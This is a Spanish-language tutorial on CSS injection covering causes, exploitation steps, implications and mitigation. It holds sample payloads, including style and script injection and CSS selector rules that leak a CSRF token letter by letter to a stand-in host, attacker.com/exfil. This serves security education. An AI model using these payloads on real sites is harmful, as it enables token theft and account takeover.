## Inyección de CSS 

## Introducción

Esta vulnerabilidad se produce cuando una aplicación web incorpora una funcionalidad en la que el usuario es capaz de "colaborar" o "afectar" a los estilos CSS de una página web.
Esto ocurre cuando la aplicación web no filtra los datos introducidos antes de tratar de procesarlos como CSS, dándole a los atacantes la posibilidad de derivar a otros ataques mas peligrosos desde un CSSi (Defacement, CSRF, XSS, HTML i...).

## Causas comunes

Normalmente este tipo de vulnerabilidad ocurre debido a la falta de sanitización y filtrado de las entradas de los usuarios, o si no se implementa bien un CSP (*Content Security Policy*).

En este ejemplo vemos como podemos introducir una etiqueta HTML style y procesar y ejecutar código CSS.

```html
<textarea name="biografia">Mi nombre es Usuario Malicioso y <style>body { display: none; }</style> soy un hacker.</textarea>
```

Frente a esta inyección, hay muchas más, por ejemplo introduciendo el payload en la url:

```html
https://example.com/search?term=<script>document.body.style.backgroundColor='red';</script>
```

O tal vez la web usa las *cookies* almacenadas para personalizar un saludo, un atacante podría modificar el valor de la cookie en cuestión e introducir ahí nuestro payload.

## Pasos de explotación

1. **Identificación de Campos de Entrada del Usuario:**
    - Buscar en la aplicación web todos los campos de entrada donde los usuarios puedan proporcionar datos que sean interpretados como CSS, como formularios de comentarios, campos de búsqueda, campos de perfil, etc.
2. **Pruebas de Entrada:**
    - Introducir datos en los campos de entrada del usuario que podrían ser interpretados como código CSS, como etiquetas `<style>` o propiedades de estilo como `background-color`, `color`, etc.
3. **Observación de Resultados:**
    - Observar cómo la aplicación web procesa y muestra los datos ingresados en los campos de entrada. Si los estilos CSS se aplican correctamente y afectan la apariencia de la página, esto podría indicar la presencia de una vulnerabilidad de inyección de CSS.
4. **Exploración de Parámetros de URL:**
    - Analizar los parámetros de URL que son utilizados por la aplicación web para construir o modificar la apariencia de la página. Manipular estos parámetros para incluir código CSS malicioso y observar si se refleja en la página web.
5. **Revisión de Cookies:**
    - Revisar las cookies utilizadas por la aplicación web y analizar si contienen datos que podrían ser interpretados como CSS. Manipular estas cookies para incluir código CSS malicioso y observar si se refleja en la página web.
6. **Pruebas de Funcionalidades Dinámicas:**
    - Probar funcionalidades dinámicas de la aplicación web, como comentarios, mensajes de chat, áreas de perfil, etc., para identificar posibles puntos de entrada para la inyección de CSS.
## Implicaciones

La vulnerabilidad de inyección de CSS, tiene muchas implicaciones, por ejemplo se pueden usar selectores de elementos para tratar de descubrir información sensible, como el token CSRF:
```css
input[name=csrf][value^=a]{
    background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
    background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
    background-image: url(https://attacker.com/exfil/9);   
}
```

En este ejemplo se trata de seleccionar el input con el nombre *csrf* , a continuación mediante una sencilla expresión regular, el atacante crea un diccionario de estos selectores para por fuerza bruta comprobar si el *token csrf* comienza por una letra u otra, cuando comienza por una letra, se hace una petición GET, simulando cargar una imagen de fondo. La petición llega al servidor del atacante y poco a poco irá descubriendo el token.  [Fuente](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection)

Normalmente el input que contiene el token csrf se le pone el atributo `(type="hidden")`, esto parece que puede dificultar lo anterior, ya que los elementos con la propiedad *hidden* no cargan imágenes, pero modificando un poco la expresión regular, conseguimos hacerle el *bypass*.

```css
input[name=csrf][value^=csrF] ~ * {
    background-image: url(https://attacker.com/exfil/csrF);
}
```

Con este cambio, los estilos se aplicarán en los componentes hermanos del input objetivo.

Como [hacktricks](https://book.hacktricks.xyz/v/es/pentesting-web/xs-search/css-injection) comenta, se puede usar esta vulnerabilidad para ir descubriendo información de la página web que carga los estilos, incluso si no tienes ni idea de que infroamcón puede tener, esto se consigue mediante los selectores **:has** y **:not** y jugando con expresiones regulares:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```

Como estos payloads, encontramos muchas variedades, CSSi tiene como objetivos principales la exfiltración de información, y derivar a otros ataques que permitan mas funcionalidad (CSRF,XSS...)

## Mitigación

La mitigación de este tipo de vulnerabilidad, consiste en validar las entradas del usuario antes de procesarlas como CSS, escapar caracteres especiales (`<`, `>`, `&`, `"`, `'` ) , configurar una buena implementación de CSP para controlar que recursos e imágenes pueden ser cargados.

## Referencias
- ChatGPT
- [Hacktricks/css-injection](https://book.hacktricks.xyz/v/es/pentesting-web/xs-search/css-injection)
- [Owasp](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection)